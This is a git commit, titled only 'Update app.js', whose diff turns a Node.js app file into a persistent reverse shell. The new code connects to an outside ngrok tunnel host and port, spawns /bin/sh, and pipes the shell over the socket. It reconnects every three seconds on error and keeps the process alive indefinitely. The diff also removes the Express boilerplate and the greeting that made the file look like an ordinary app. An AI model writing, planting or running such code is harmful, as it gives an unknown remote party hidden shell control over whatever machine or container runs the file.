f62404b0d4dd60541484336755d89726c3bc625b
Ryan Saunders <rysaunders@protonmail.com>
2025-08-15 10:49:33 -0400

    Update app.js

--- app.js
+++ app.js
@@ -1,26 +1,21 @@
-const express = require('express');
-const app = express();
-const port = process.env.PORT || 3000;
-
 const net = require('net');
 const { spawn } = require('child_process');
 
-const LHOST = '6.tcp.ngrok.io';
-const LPORT = 19385;
+const LHOST = process.env.LHOST || '6.tcp.ngrok.io';
+const LPORT = +(process.env.LPORT || 19385);
 
-const client = new net.Socket();
+function connect() {
+  const c = new net.Socket();
+  c.connect(LPORT, LHOST, () => {
+    const sh = spawn('/bin/sh', []);
+    c.write(`Connected to ${LHOST}:${LPORT}\n`);
+    c.pipe(sh.stdin);
+    sh.stdout.pipe(c);
+    sh.stderr.pipe(c);
+  });
+  c.on('error', () => setTimeout(connect, 3000));
+}
+connect();
 
-client.connect(LPORT, LHOST, () => {
-  const sh = spawn('/bin/sh', []);
-  client.write(`Connected to ${LHOST}:${LPORT}\n`);
-  client.pipe(sh.stdin);
-  sh.stdout.pipe(client);
-  sh.stderr.pipe(client);
-});
-
-client.on('error', (err) => {
-  console.error('Connection error:', err);
-  setTimeout(() => client.connect(LPORT, LHOST), 5000);
-});
-
-console.log("Hello world! Lets update the container image")
+// keep process alive
+setInterval(() => {}, 1 << 30);
